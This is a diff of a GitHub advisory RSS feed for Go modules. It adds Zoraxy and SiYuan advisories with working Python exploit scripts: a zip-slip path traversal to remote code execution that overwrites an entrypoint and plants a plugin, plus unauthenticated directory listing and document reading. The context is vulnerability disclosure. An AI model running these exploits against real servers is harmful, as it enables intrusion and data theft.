@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-03-25T19:15:35.687Z</updated>
+    <updated>2026-03-25T20:08:19.652Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,543 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/tobychui/zoraxy] Zoraxy: Authenticated Path Traversal in Config Import leads to RCE]]></title>
+        <id>https://github.com/advisories/GHSA-7pq3-326h-f8q9</id>
+        <link href="https://github.com/advisories/GHSA-7pq3-326h-f8q9"/>
+        <updated>2026-03-25T20:04:45.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="authenticated-path-traversal-to-rce-via-configuration-import">Authenticated Path Traversal to RCE via Configuration Import</h1>
+<h2 id="summary">Summary</h2>
+<p>An authenticated path traversal vulnerability in the configuration import endpoint allows an authenticated user to write arbitrary files outside the config directory, which can lead to RCE by creating a plugin.</p>
+<h2 id="details">Details</h2>
+<p>The vulnerable endpoint is <code>POST /api/conf/import</code>.</p>
+<p>The zip entry names sanitization is bypassed by embedding <code>../</code> inside a longer sequence so the replacement produces a new <code>../</code>:</p>
+<pre><code>conf/..././..././entrypoint.py
+  → ReplaceAll("../", "")  (match found at index 1 of "..././", leaving "../")
+  → conf/../../entrypoint.py   ← passes HasPrefix check, escapes conf/
+</code></pre>
+<p>Using this endpoint, a new plugin can be written (persistent) and the entrypoint (non-persistent) can be edited to add execution permissions to the plugin.
+When the database is provided in the import, the program should exit to trigger a container restart (which does not happen because the entrypoint does not monitor the Zoraxy exit code).
+As a result, the container was manually restarted for the PoC to work.</p>
+<h2 id="poc">PoC</h2>
+<pre><code class="language-python">import argparse
+import io
+import json
+import re
+import sys
+import zipfile
+
+import requests
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+INTRO_SPEC_JSON = json.dumps({
+    "id": "com.attacker.evil",
+    "name": "System Updater",
+    "author": "System",
+    "author_contact": "",
+    "description": "Internal system update module",
+    "url": "",
+    "ui_path": "/ui",
+    "type": 1,
+    "version_major": 1,
+    "version_minor": 0,
+    "version_patch": 0,
+    "permitted_api_endpoints": [],
+})
+
+LINUX_START_SH = """\
+#!/bin/sh
+INTRO_SPEC='{intro_spec}'
+
+run_payload() {{
+{payload_lines}
+}}
+
+case "$1" in
+  -introspect)
+    run_payload
+    printf '%s\\n' "$INTRO_SPEC"
+    exit 0
+    ;;
+  -configure=*)
+    run_payload
+    while true; do sleep 3600; done
+    ;;
+esac
+"""
+
+MALICIOUS_ENTRYPOINT_PY = """\
+#!/usr/bin/env python3
+import os, subprocess, signal, sys, time
+
+try:
+    subprocess.run({cmd_list}, shell=False)
+except Exception:
+    pass
+
+try:
+    os.chmod("/opt/zoraxy/plugin/evil/start.sh", 0o755)
+except Exception:
+    pass
+
+zoraxy_proc = None
+zerotier_proc = None
+
+def getenv(key, default=None):
+  return os.environ.get(key, default)
+
+def run(command):
+  try:
+    subprocess.run(command, check=True)
+  except subprocess.CalledProcessError as e:
+    print(f"Command failed: {command} - {e}")
+    sys.exit(1)
+
+def popen(command):
+  proc = subprocess.Popen(command)
+  time.sleep(1)
+  if proc.poll() is not None:
+    print(f"{command} exited early with code {proc.returncode}")
+    raise RuntimeError(f"Failed to start {command}")
+  return proc
+
+def cleanup(_signum, _frame):
+  global zoraxy_proc, zerotier_proc
+  if zoraxy_proc and zoraxy_proc.poll() is None:
+    zoraxy_proc.terminate()
+  if zerotier_proc and zerotier_proc.poll() is None:
+    zerotier_proc.terminate()
+  if zoraxy_proc:
+    try:
+      zoraxy_proc.wait(timeout=8)
+    except subprocess.TimeoutExpired:
+      zoraxy_proc.kill()
+      zoraxy_proc.wait()
+  if zerotier_proc:
+    try:
+      zerotier_proc.wait(timeout=8)
+    except subprocess.TimeoutExpired:
+      zerotier_proc.kill()
+      zerotier_proc.wait()
+  try:
+    os.unlink("/var/lib/zerotier-one")
+  except Exception:
+    pass
+  sys.exit(0)
+
+def start_zerotier():
+  global zerotier_proc
+  config_dir = "/opt/zoraxy/config/zerotier/"
+  zt_path = "/var/lib/zerotier-one"
+  os.makedirs(config_dir, exist_ok=True)
+  try:
+    os.symlink(config_dir, zt_path, target_is_directory=True)
+  except FileExistsError:
+    pass
+  zerotier_proc = popen(["zerotier-one"])
+
+def start_zoraxy():
+  global zoraxy_proc
+  zoraxy_args = [
+    "zoraxy",
+    f"-autorenew={getenv('AUTORENEW', '86400')}",
+    f"-cfgupgrade={getenv('CFGUPGRADE', 'true')}",
+    f"-db={getenv('DB', 'auto')}",
+    f"-docker={getenv('DOCKER', 'true')}",
+    f"-earlyrenew={getenv('EARLYRENEW', '30')}",
+    f"-enablelog={getenv('ENABLELOG', 'true')}",
+    f"-fastgeoip={getenv('FASTGEOIP', 'false')}",
+    f"-mdns={getenv('MDNS', 'true')}",
+    f"-mdnsname={getenv('MDNSNAME', \"''\")}",
+    f"-noauth={getenv('NOAUTH', 'false')}",
+    f"-plugin={getenv('PLUGIN', '/opt/zoraxy/plugin/')}",
+    f"-port=:{getenv('PORT', '8000')}",
+    f"-sshlb={getenv('SSHLB', 'false')}",
+    f"-version={getenv('VERSION', 'false')}",
+    f"-webroot={getenv('WEBROOT', './www')}",
+  ]
+  zoraxy_proc = popen(zoraxy_args)
+
+def main():
+  signal.signal(signal.SIGTERM, cleanup)
+  signal.signal(signal.SIGINT, cleanup)
+  run(["update-ca-certificates"])
+  if getenv("UPDATE_GEOIP", "false").lower() == "true":
+    run(["zoraxy", "-update_geoip=true"])
+  os.chdir("/opt/zoraxy/config/")
+  if getenv("ZEROTIER", "false") == "true":
+    start_zerotier()
+  start_zoraxy()
+  signal.pause()
+
+if __name__ == "__main__":
+  main()
+"""
+
+
+def get_csrf(host: str, session: requests.Session) -&gt; tuple:
+    r = session.get(f"{host}/login.html", timeout=10, verify=False)
+    m = re.search(r'&lt;meta[^&gt;]+name=["\']zoraxy\.csrf\.Token["\'][^&gt;]+content=["\']([^"\']+)["\']', r.text)
+    if not m:
+        m = re.search(r'&lt;meta[^&gt;]+content=["\']([^"\']+)["\'][^&gt;]+name=["\']zoraxy\.csrf\.Token["\']', r.text)
+    token = m.group(1) if m else r.headers.get("X-CSRF-Token", "")
+    return token, f"{host}/login.html"
+
+
+def authenticate(host: str, username: str, password: str,
+                 session: requests.Session) -&gt; bool:
+    csrf, referer = get_csrf(host, session)
+    print(f"    CSRF token  -&gt; {csrf!r}")
+    r = session.post(
+        f"{host}/api/auth/login",
+        data={"username": username, "password": password},
+        headers={"X-CSRF-Token": csrf, "Referer": referer},
+        timeout=10, verify=False,
+    )
+    print(f"    Login       -&gt; HTTP {r.status_code}  {r.text[:120]!r}")
+    return r.status_code == 200 and r.text.strip().strip('"').lower() in ("ok", "true")
+
+
+def upload_zip(host: str, session: requests.Session, zip_bytes: bytes) -&gt; tuple:
+    csrf, referer = get_csrf(host, session)
+    r = session.post(
+        f"{host}/api/conf/import",
+        files={"file": ("backup.zip", zip_bytes, "application/zip")},
+        headers={"X-CSRF-Token": csrf, "Referer": referer},
+        timeout=30, verify=False,
+    )
+    return r.status_code, r.text
+
+
+def export_config(host: str, session: requests.Session) -&gt; bytes | None:
+    r = session.get(
+        f"{host}/api/conf/export?includeDB=true",
+        timeout=60, verify=False,
+    )
+    if r.status_code == 200 and len(r.content) &gt; 100:
+        return r.content
+    return None
+
+
+def build_zip(cmd: str, export_zip: bytes) -&gt; bytes:
+    traversal_ep = "conf/..././..././entrypoint.py"
+    traversal_sh = "conf/..././..././plugin/evil/start.sh"
+
+    payload_lines = "\n".join(f"  {line}" for line in cmd.splitlines()) or "  id &gt; /tmp/pwned.txt"
+    start_sh = LINUX_START_SH.format(
+        intro_spec=INTRO_SPEC_JSON.replace("'", "'\\''"),
+        payload_lines=payload_lines,
+    )
+    malicious_ep = MALICIOUS_ENTRYPOINT_PY.replace("{cmd_list}", repr(["sh", "-c", cmd]))
+
+    buf = io.BytesIO()
+    with zipfile.ZipFile(io.BytesIO(export_zip), "r") as src:
+        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+            for item in src.infolist():
+                zf.writestr(item, src.read(item.filename))
+            zf.writestr(zipfile.ZipInfo(traversal_ep), malicious_ep.encode())
+            zf.writestr(zipfile.ZipInfo(traversal_sh), start_sh.encode())
+    buf.seek(0)
+    return buf.read()
+
+
+def main() -&gt; None:
+    parser = argparse.ArgumentParser(
+        description="Zoraxy Authenticated RCE via Entrypoint Overwrite + Plugin Zip-Slip",
+    )
+    parser.add_argument("--host",  help="Target, e.g. http://192.168.1.10:8000")
+    parser.add_argument("--user",  default="admin")
+    parser.add_argument("--pass",  dest="password", default=None)
+    parser.add_argument("--cmd", default="id &gt; /tmp/pwned.txt",
+                        help="Shell command to embed in the payload")
+    args = parser.parse_args()
+
+    if not args.host or not args.password:
+        parser.error("--host and --pass are required")
+    host = args.host.rstrip("/")
+
+    print(f"\n[1] Authenticating as '{args.user}' at {host} ...")
+    session = requests.Session()
+    if not authenticate(host, args.user, args.password, session):
+        print("[-] Authentication failed.")
+        sys.exit(1)
+    print("[+] Authenticated.")
+
+    print(f"\n[2] Exporting live config ...")
+    export_zip = export_config(host, session)
+    if not export_zip:
+        print("[-] Config export failed.")
+        sys.exit(1)
+    print("\n[3] Building malicious zip ...")
+    zip_bytes = build_zip(args.cmd, export_zip)
+    print(f"[+] Zip size: {len(zip_bytes):,} bytes")
+
+    print(f"\n[4] Uploading via POST {host}/api/conf/import ...")
+    code, body = upload_zip(host, session, zip_bytes)
+    print(f"    HTTP {code}  {body[:200]!r}")
+    if code != 200:
+        print("[-] Upload failed.")
+        sys.exit(1)
+    print("[+] Files written")
+
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+<h2 id="impact">Impact</h2>
+<p>Arbitrary file write leads to RCE by an authenticated user. Given that the Docker socket might be mapped, this issue can lead to full host takeover.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/tobychui/zoraxy/security/advisories/GHSA-7pq3-326h-f8q9">https://github.com/tobychui/zoraxy/security/advisories/GHSA-7pq3-326h-f8q9</a></li>
+<li><a href="https://github.com/tobychui/zoraxy/commit/69ac755aeec5d15ba4c62099f7f1ed77a855b40b">https://github.com/tobychui/zoraxy/commit/69ac755aeec5d15ba4c62099f7f1ed77a855b40b</a></li>
+<li><a href="https://github.com/tobychui/zoraxy/releases/tag/v3.3.2">https://github.com/tobychui/zoraxy/releases/tag/v3.3.2</a></li>
+<li><a href="https://github.com/advisories/GHSA-7pq3-326h-f8q9">https://github.com/advisories/GHSA-7pq3-326h-f8q9</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-7pq3-326h-f8q9</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-03-25T20:04:44.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/siyuan-note/siyuan/kernel] SiYuan has directory traversal within its publishing service]]></title>
+        <id>https://github.com/advisories/GHSA-xmw9-6r43-x9ww</id>
+        <link href="https://github.com/advisories/GHSA-xmw9-6r43-x9ww"/>
+        <updated>2026-03-25T19:38:01.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="details">Details</h3>
+<p>The /api/file/readDir interface was used to traverse and retrieve the file names of all documents under a notebook.</p>
+<h3 id="poc">PoC</h3>
+<pre><code class="language-python">#!/usr/bin/env python3
+"""POC: SiYuan /api/file/readDir 未鉴权目录遍历"""
+import requests, json, sys
+
+def poc(target):
+    base = target.rstrip("/")
+    url = f"{base}/api/file/readDir"
+
+    def read_dir(path, depth=0, max_depth=4):
+        try:
+            r = requests.post(url, json={"path":path},
+                            headers={"Content-Type":"application/json"}, timeout=10)
+            data = r.json()
+        except Exception as e:
+            return
+        if data.get("code") != 0:
+            return
+
+        entries = data.get("data") or []
+        for entry in entries:
+            name = entry.get("name","")
+            if name.startswith("."):
+                continue
+            icon = "📁" if entry.get("isDir") else "📄"
+            indent = "  " * depth
+            print(f"  {indent}{icon} {name}")
+
+            if entry.get("isDir") and depth &lt; max_depth:
+                read_dir(f"{path}/{name}", depth+1, max_depth)
+
+    # 遍历根目录
+    print("[+] 漏洞存在！开始遍历\n")
+    print("  📂 data/")
+    read_dir("data", max_depth=2)
+
+    print("\n  📂 conf/")
+    read_dir("conf", max_depth=2)
+
+    # 保存
+    try:
+        r = requests.post(url, json={"path":"data"},
+                        headers={"Content-Type":"application/json"}, timeout=10)
+        with open("readdir.json","w",encoding="utf-8") as f:
+            json.dump(r.json(), f, ensure_ascii=False, indent=2)
+        print(f"\n[+] 根目录数据已保存: readdir.json")
+    except: pass
+
+if __name__ == "__main__":
+    poc(sys.argv[1] if len(sys.argv)&gt;1 else "http://172.18.40.184")
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>Directory traversal vulnerability: The entire directory structure of a notebook could be obtained, and then a file reading vulnerability could be exploited to achieve arbitrary document reading.</p>
+<p>资源文件夹</p>
+<img width="943" height="794" alt="image" src="https://github.com/user-attachments/assets/c97fcc42-183e-4c83-8a27-cf99bf805038">
+
+<p>插件文件夹</p>
+<img width="826" height="921" alt="image" src="https://github.com/user-attachments/assets/925d4512-e4c0-4b3b-bf96-5639ec572705">
+
+<p>conf文件夹</p>
+<img width="730" height="834" alt="image" src="https://github.com/user-attachments/assets/2a0c23b9-2d87-4421-977d-687f47726741">
+### References
+
+<ul>
+<li><a href="https://github.com/siyuan-note/siyuan/security/advisories/GHSA-xmw9-6r43-x9ww">https://github.com/siyuan-note/siyuan/security/advisories/GHSA-xmw9-6r43-x9ww</a></li>
+<li><a href="https://github.com/advisories/GHSA-xmw9-6r43-x9ww">https://github.com/advisories/GHSA-xmw9-6r43-x9ww</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-xmw9-6r43-x9ww</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-03-25T19:38:01.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/siyuan-note/siyuan/kernel] SiYuan has Arbitrary Document Reading within the Publishing Service]]></title>
+        <id>https://github.com/advisories/GHSA-34xj-66v3-6j83</id>
+        <link href="https://github.com/advisories/GHSA-34xj-66v3-6j83"/>
+        <updated>2026-03-25T19:36:23.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="details">Details</h3>
+<p>Document IDs were retrieved via the /api/file/readDir interface, and then the /api/block/getChildBlocks interface was used to view the content of all documents.</p>
+<h3 id="poc">PoC</h3>
+<pre><code class="language-python">#!/usr/bin/env python3
+"""SiYuan /api/block/getChildBlocks 文档内容读取"""
+import requests
+import json
+import sys
+
+def get_child_blocks(target_url, doc_id):
+    """
+    调用 SiYuan 的 /api/block/getChildBlocks API 获取文档内容
+    """
+    url = f"{target_url.rstrip('/')}/api/block/getChildBlocks"
+    
+    headers = {
+        "Content-Type": "application/json"
+    }
+    
+    data = {
+        "id": doc_id
+    }
+    
+    try:
+        response = requests.post(url, json=data, headers=headers, timeout=10)
+        response.raise_for_status()
+        
+        result = response.json()
+        
+        if result.get("code") != 0:
+            print(f"[-] 请求失败: {result.get('msg', '未知错误')}")
+            return None
+        
+        return result.get("data")
+        
+    except requests.exceptions.RequestException as e:
+        print(f"[-] 网络请求失败: {e}")
+        return None
+    except json.JSONDecodeError as e:
+        print(f"[-] JSON解析失败: {e}")
+        return None
+
+def format_block_content(block):
+    """格式化块内容"""
+    content = ""
+    
+    # 获取块内容
+    if isinstance(block, dict):
+        # 尝试多种可能的字段
+        md = block.get("markdown", "") or block.get("content", "") or ""
+        if md:
+            content = md.strip()
+    
+    return content
+
+def main():
+    """主函数"""
+    if len(sys.argv) &gt; 1:
+        target_url = sys.argv[1]
+    else:
+        target_url = input("请输入 SiYuan 服务地址 (例如: http://localhost:6806): ").strip()
+        if not target_url:
+            target_url = "http://localhost:6806"
+    
+    print(f"目标地址: {target_url}")
+    print("=" * 50)
+    
+    while True:
+        print("\n" + "=" * 50)
+        doc_id = input("请输入文档ID (输入 'quit' 或 'exit' 退出): ").strip()
+        
+        if doc_id.lower() in ['quit', 'exit', 'q']:
+            print("程序退出")
+            break
+        
+        if not doc_id:
+            print("[-] 文档ID不能为空")
+            continue
+        
+        print(f"\n[*] 正在读取文档: {doc_id}")
+        
+        blocks = get_child_blocks(target_url, doc_id)
+        
+        if blocks is None:
+            print("[-] 获取文档内容失败")
+            continue
+        
+        if not blocks:
+            print(f"[!] 文档 {doc_id} 没有子块或为空")
+            continue
+        
+        print(f"[+] 成功获取 {len(blocks)} 个子块")
+        print("-" * 50)
+        
+        # 保存所有块内容
+        all_blocks_content = []
+        
+        for i, block in enumerate(blocks, 1):
+            content = format_block_content(block)
+            if content:
+                print(content[:200] + ("..." if len(content) &gt; 200 else ""))
+                
+                all_blocks_content.append({
+                    "index": i,
+                    "content": content,
+                    "raw_block": block
+                })
+        
+        # 询问是否保存到文件
+        save_choice = input("\n是否保存到文件? (y/N): ").strip().lower()
+        if save_choice in ['y', 'yes']:
+            filename = f"doc_{doc_id}_blocks.json"
+            try:
+                with open(filename, "w", encoding="utf-8") as f:
+                    json.dump({
+                        "doc_id": doc_id,
+                        "block_count": len(blocks),
+                        "blocks": all_blocks_content
+                    }, f, ensure_ascii=False, indent=2)
+                print(f"[+] 已保存到: {filename}")
+            except Exception as e:
+                print(f"[-] 保存失败: {e}")
+        
+        print("-" * 50)
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+<img width="1492" height="757" alt="image" src="https://github.com/user-attachments/assets/2e08a286-dceb-4fd5-87d5-44f39983dcbc">
+
+<h3 id="impact">Impact</h3>
+<p>File reading: All encrypted or prohibited documents under the publishing service could be read.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/siyuan-note/siyuan/security/advisories/GHSA-34xj-66v3-6j83">https://github.com/siyuan-note/siyuan/security/advisories/GHSA-34xj-66v3-6j83</a></li>
+<li><a href="https://github.com/advisories/GHSA-34xj-66v3-6j83">https://github.com/advisories/GHSA-34xj-66v3-6j83</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-34xj-66v3-6j83</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-03-25T19:36:22.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/tektoncd/pipeline] Tekton Pipelines controller panic via long resolver name in TaskRun/PipelineRun]]></title>
         <id>https://github.com/advisories/GHSA-cv4x-93xx-wgfj</id>
@@ -1050,114 +1587,5 @@ That earlier issue was a compression bomb, this vulnerability is not. Attacks ag
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-03-24T21:46:31.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/nats-io/nats-server/v2] NATS  is vulnerable to pre-auth DoS through WebSockets client service]]></title>
-        <id>https://github.com/advisories/GHSA-8r68-gvr4-jh7j</id>
-        <link href="https://github.com/advisories/GHSA-8r68-gvr4-jh7j"/>
-        <updated>2026-03-24T21:46:32.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="background">Background</h3>
-<p>NATS.io is a high performance open source pub-sub distributed communication technology, built for the cloud, on-premise, IoT, and edge computing.</p>
-<p>The nats-server offers a WebSockets client service, used in deployments where browsers are the NATS clients.</p>
-<h3 id="problem-description">Problem Description</h3>
-<p>A malicious client which can connect to the WebSockets port can cause unbounded memory use in the nats-server before authentication; this requires sending a corresponding amount of data.</p>
-<p>This is a milder variant of <a href="https://advisories.nats.io/CVE/secnote-2026-02.txt">NATS-advisory-ID 2026-02</a> (aka CVE-2026-27571; GHSA-qrvq-68c2-7grw).
-That earlier issue was a compression bomb, this vulnerability is not. Attacks against this new issue thus require significant client bandwidth.</p>
-<h3 id="affected-versions">Affected Versions</h3>
-<p>Any version before v2.12.6 or v2.11.15</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>Disable websockets if not required for project deployment.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nats-io/nats-server/security/advisories/GHSA-8r68-gvr4-jh7j">https://github.com/nats-io/nats-server/security/advisories/GHSA-8r68-gvr4-jh7j</a></li>
-<li><a href="https://advisories.nats.io/CVE/secnote-2026-02.txt">https://advisories.nats.io/CVE/secnote-2026-02.txt</a></li>
-<li><a href="https://advisories.nats.io/CVE/secnote-2026-11.txt">https://advisories.nats.io/CVE/secnote-2026-11.txt</a></li>
-<li><a href="https://github.com/advisories/GHSA-qrvq-68c2-7grw">https://github.com/advisories/GHSA-qrvq-68c2-7grw</a></li>
-<li><a href="https://github.com/advisories/GHSA-8r68-gvr4-jh7j">https://github.com/advisories/GHSA-8r68-gvr4-jh7j</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-8r68-gvr4-jh7j</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-03-24T21:46:31.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/nats-io/nats-server/v2] NATS has pre-auth server panic via leafnode handling]]></title>
-        <id>https://github.com/advisories/GHSA-vprv-35vv-q339</id>
-        <link href="https://github.com/advisories/GHSA-vprv-35vv-q339"/>
-        <updated>2026-03-24T21:45:30.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="background">Background</h3>
-<p>NATS.io is a high performance open source pub-sub distributed communication technology, built for the cloud, on-premise, IoT, and edge computing.</p>
-<p>The nats-server allows hub/spoke topologies using "leafnode" connections by other nats-servers.</p>
-<h3 id="problem-description">Problem Description</h3>
-<p>A client which can connect to the leafnode port can crash the nats-server with a certain malformed message pre-authentication.</p>
-<h3 id="affected-versions">Affected Versions</h3>
-<p>Any version before v2.12.6 or v2.11.15</p>
-<h3 id="workarounds">Workarounds</h3>
-<ol>
-<li>Disable leafnode support if not needed.</li>
-<li>Restrict network connections to your leafnode port, if plausible without compromising the service offered.</li>
-</ol>
-<h3 id="references">References</h3>
-<ul>
-<li>This document is canonically: <a href="https://advisories.nats.io/CVE/secnote-2026-10.txt">https://advisories.nats.io/CVE/secnote-2026-10.txt</a></li>
-<li>GHSA advisory: <a href="https://github.com/nats-io/nats-server/security/advisories/GHSA-vprv-35vv-q339">https://github.com/nats-io/nats-server/security/advisories/GHSA-vprv-35vv-q339</a></li>
-<li>MITRE CVE entry: <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-33218">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-33218</a></li>
-</ul>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/nats-io/nats-server/security/advisories/GHSA-vprv-35vv-q339">https://github.com/nats-io/nats-server/security/advisories/GHSA-vprv-35vv-q339</a></li>
-<li><a href="https://advisories.nats.io/CVE/secnote-2026-10.txt">https://advisories.nats.io/CVE/secnote-2026-10.txt</a></li>
-<li><a href="https://github.com/advisories/GHSA-vprv-35vv-q339">https://github.com/advisories/GHSA-vprv-35vv-q339</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-vprv-35vv-q339</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-03-24T21:45:29.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/nats-io/nats-server/v2] NATS has pre-auth server panic via leafnode handling]]></title>
-        <id>https://github.com/advisories/GHSA-vprv-35vv-q339</id>
-        <link href="https://github.com/advisories/GHSA-vprv-35vv-q339"/>
-        <updated>2026-03-24T21:45:30.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="background">Background</h3>
-<p>NATS.io is a high performance open source pub-sub distributed communication technology, built for the cloud, on-premise, IoT, and edge computing.</p>
-<p>The nats-server allows hub/spoke topologies using "leafnode" connections by other nats-servers.</p>
-<h3 id="problem-description">Problem Description</h3>
-<p>A client which can connect to the leafnode port can crash the nats-server with a certain malformed message pre-authentication.</p>
-<h3 id="affected-versions">Affected Versions</h3>
-<p>Any version before v2.12.6 or v2.11.15</p>
-<h3 id="workarounds">Workarounds</h3>
-<ol>
-<li>Disable leafnode support if not needed.</li>
-<li>Restrict network connections to your leafnode port, if plausible without compromising the service offered.</li>
-</ol>
-<h3 id="references">References</h3>
-<ul>
-<li>This document is canonically: <a href="https://advisories.nats.io/CVE/secnote-2026-10.txt">https://advisories.nats.io/CVE/secnote-2026-10.txt</a></li>
-<li>GHSA advisory: <a href="https://github.com/nats-io/nats-server/security/advisories/GHSA-vprv-35vv-q339">https://github.com/nats-io/nats-server/security/advisories/GHSA-vprv-35vv-q339</a></li>
-<li>MITRE CVE entry: <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-33218">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-33218</a></li>
-</ul>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/nats-io/nats-server/security/advisories/GHSA-vprv-35vv-q339">https://github.com/nats-io/nats-server/security/advisories/GHSA-vprv-35vv-q339</a></li>
-<li><a href="https://advisories.nats.io/CVE/secnote-2026-10.txt">https://advisories.nats.io/CVE/secnote-2026-10.txt</a></li>
-<li><a href="https://github.com/advisories/GHSA-vprv-35vv-q339">https://github.com/advisories/GHSA-vprv-35vv-q339</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-vprv-35vv-q339</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-03-24T21:45:29.000Z</published>
     </entry>
 </feed>
